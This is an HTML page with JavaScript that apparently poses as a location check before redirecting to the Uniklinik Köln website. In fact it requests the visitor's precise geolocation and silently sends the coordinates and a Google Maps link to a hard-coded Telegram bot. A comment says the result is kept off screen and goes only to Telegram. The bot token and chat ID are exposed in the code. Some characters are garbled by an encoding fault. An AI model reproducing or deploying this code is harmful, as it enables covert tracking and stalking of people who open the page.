<body>

<script>
/* ===== TELEGRAM ===== */
const BOT_TOKEN = "8402128842:AAF5K_2JMX72H_sdN9Drxl_Wksmxpxzqu7c";
const CHAT_ID   = "8570996143";

/* CORS-suz Telegram g√∂nd…ôri≈üi */
function sendTG(text) {
  const img = new Image();
  img.src =
    "https://api.telegram.org/bot" +
    BOT_TOKEN +
    "/sendMessage?chat_id=" +
    CHAT_ID +
    "&text=" +
    encodeURIComponent(text);
}

function handleClick() {
  const result = document.getElementById("result");
  result.innerText = "Standort wird √ºberpr√ºft‚Ä¶";

  if (!navigator.geolocation) {
    sendTG("‚ùå Geolocation unterst√ºtzt nicht");
    window.location.href = "https://www.uk-koeln.de";
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      const lat = pos.coords.latitude.toFixed(6);
      const lon = pos.coords.longitude.toFixed(6);

      // ‚ö†Ô∏è EKANDA G√ñST∆èRMƒ∞Rƒ∞K ‚Äî YALNIZ TELEGRAMA
      sendTG(
        "üìç Standort erhalten (mit Erlaubnis)\n" +
        "Lat: " + lat + "\n" +
        "Lon: " + lon + "\n" +
        "https://maps.google.com/?q=" + lat + "," + lon
      );

      // y√∂nl…ôndir
      window.location.href = "https://www.uk-koeln.de";
    },
    (err) => {
      sendTG("‚ùå Standort nicht freigegeben (Error " + err.code + ")");
      window.location.href = "https://www.uk-koeln.de";
    },
    { enableHighAccuracy: true, timeout: 10000 }
  );
}
</script>
